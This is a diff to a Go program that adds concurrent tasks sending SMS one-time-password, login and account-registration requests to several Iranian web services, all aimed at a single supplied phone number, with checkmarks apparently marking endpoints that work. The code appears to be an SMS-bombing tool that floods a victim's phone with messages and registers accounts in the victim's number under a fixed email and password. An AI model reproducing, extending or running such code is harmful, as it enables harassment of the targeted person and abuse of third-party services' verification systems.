@@ -494,7 +494,31 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
+//yeki az ina...
+// --- my.limoome.com  ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        phoneNo98 := strings.TrimPrefix(phone, "+98")
+        payload := map[string]interface{}{
+            "mobileNumber": phoneNo98,
+            "countryId":    "1",
+        }
+        sendJSONRequest(c, ctx, "https://my.limoome.com/auth/check-mobile", payload, &wg, ch)
+    }
+}(client)
 
+// --- my.limoome.com  ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        phoneNo98 := strings.TrimPrefix(phone, "+98")
+        formData := url.Values{}
+        formData.Set("mobileNumber", phoneNo98)
+        formData.Set("country", "1")
+        sendFormRequest(c, ctx, "https://my.limoome.com/api/auth/login/otp", formData, &wg, ch)
+    }
+}(client)
 // ------ alibaba.ir ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
@@ -766,6 +790,22 @@ tasks <- func(c *http.Client) func() {
                 sendJSONRequest(c, ctx, "https://www.darsban.com/api/usersmslogin", payload, &wg, ch)
                 }
         }(client)
+
+		// oldpanel.avalpardakht.com  ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"email":             "codedbymonsmain@gmail.com", 
+					"is_business":       0, 
+					"mobile":            phone, 
+					"online_chat_token":     "", 
+					"password":          "SecurePass123!", 
+					"rules":             true,
+				}
+				sendJSONRequest(c, ctx, "https://oldpanel.avalpardakht.com/panel/api/v1/auth/register", payload, &wg, ch)
+			}
+		}(client)
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 		// novinparse.com (SMS - POST Form) ✅ 
 		wg.Add(1)
